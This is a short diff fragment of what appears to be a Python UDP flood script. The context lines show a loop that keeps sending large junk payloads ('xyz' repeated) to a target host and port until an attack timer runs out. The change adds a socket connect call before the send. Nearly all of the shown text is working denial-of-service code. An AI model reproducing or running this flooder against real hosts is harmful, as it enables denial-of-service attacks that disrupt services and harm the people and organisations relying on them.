@@ -18,6 +18,7 @@ def rand_items():
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 while time.time() < start_time+att_time:
+    s.connect((target, port))
     s.sendto("xyz"*size, (target, port))
 
 s.close()
